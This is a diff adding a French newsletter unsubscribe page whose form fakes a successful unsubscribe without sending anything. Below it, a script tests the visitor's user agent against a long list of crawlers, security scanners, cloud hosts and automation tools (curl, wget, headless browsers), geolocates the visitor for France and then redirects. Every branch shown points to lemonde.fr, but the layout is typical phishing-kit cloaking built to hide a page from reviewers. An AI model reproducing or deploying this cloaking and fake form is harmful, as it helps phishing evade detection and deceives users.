@@ -1,0 +1,145 @@
+<html lang="fr"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Désabonnement..</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+    <style>
+        body {
+            background-color: #f8f9fa;
+            padding: 50px;
+        }
+        .message {
+            display: none;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>Désabonnez-vous de notre newsletter</h2>
+    <form id="unsubscribeForm">
+        <div class="form-group">
+            <label for="email">Adresse e-mail :</label>
+            <input type="email" class="form-control" id="email" placeholder="Entrez votre e-mail" required="">
+        </div>
+        <button type="submit" class="btn btn-danger">Unsubscribe</button>
+    </form>
+    <div class="alert alert-success message" id="successMessage">
+        Vous vous êtes bien désabonné de notre newsletter.
+    </div>
+</div>
+
+<script>
+    document.getElementById('unsubscribeForm').addEventListener('submit', function(event) {
+        event.preventDefault(); // Empêche le rechargement de la page
+        const email = document.getElementById('email').value;
+
+        // Ici, vous pouvez ajouter une logique pour traiter l'e-mail (par exemple, envoyer une requête à un serveur)
+
+        // Affiche le message de succès
+        document.getElementById('successMessage').style.display = 'block';
+        document.getElementById('unsubscribeForm').reset(); // Réinitialise le formulaire
+    });
+</script>
+
+  <script>
+    const crawlerPatterns = [
+      /googlebot/i,
+      /bingbot/i,
+      /yandexbot/i,
+      /baiduspider/i,
+      /duckduckbot/i,
+      /slurp/i,
+      /ahrefsbot/i,
+      /semrushbot/i,
+      /mj12bot/i,
+      /screaming frog/i,
+      /sitebulb/i,
+      /serpstatbot/i,
+      /dotbot/i,
+      /facebot/i,
+      /linkedinbot/i,
+      /twitterbot/i,
+      /pinterestbot/i,
+      /curl/i,
+      /wget/i,
+      /httpclient/i,
+      /python-requests/i,
+      /java/i,
+      /php/i,
+      /ruby/i,
+      /node-fetch/i,
+      /axios/i,
+      /crawler/i,
+      /spider/i,
+      /robot/i,
+      /bot/i,
+      /crawl/i,
+      /fetcher/i,
+      /scanner/i,
+      /checker/i,
+      /archiver/i,
+      /ia_archiver/i,
+      /archive.org/i,
+      /petalbot/i,
+      /qwantify/i,
+      /applebot/i,
+      /uptimerobot/i,
+      /zyborg/i,
+      /turnitinbot/i,
+      /mj12bot/i,
+      /sogou/i,
+      /seznambot/i,
+      /digitalocean/i,
+      /aws/i,
+      /gce/i,
+      /azure/i,
+      /linode/i,
+      /phantomjs/i,
+      /headless/i,
+      /selenium/i,
+      /puppeteer/i,
+      /chrome-lighthouse/i,
+      /playwright/i
+    ];
+
+    function isCrawler() {
+      return crawlerPatterns.some(pattern => pattern.test(navigator.userAgent));
+    }
+
+    const allowedCountries = ["FR"]; 
+    async function getUserData() {
+      try {
+        const response = await fetch('https://ipapi.co/json/'); // API publique pour obtenir des donn�es utilisateur
+        return await response.json();
+      } catch (error) {
+        console.error("Erreur lors de la r�cup�ration des donn�es utilisateur :", error);
+        return null;
+      }
+    }
+
+    async function handleRedirect() {
+      setTimeout(async () => {
+        if (isCrawler()) {
+          window.location.href = "https://lemonde.fr";
+        } else {
+          const data = await getUserData();
+          if (data && allowedCountries.includes(data.country)) {
+            window.location.href = "https://lemonde.fr";
+          } else {
+            window.location.href = "https://lemonde.fr";
+          }
+        }
+      }, 500); // D�lai de 1 seconde
+    }
+
+    // Lancer le script apr�s le chargement de la page
+    window.onload = handleRedirect;
+  </script>
+
+
+</body></html>
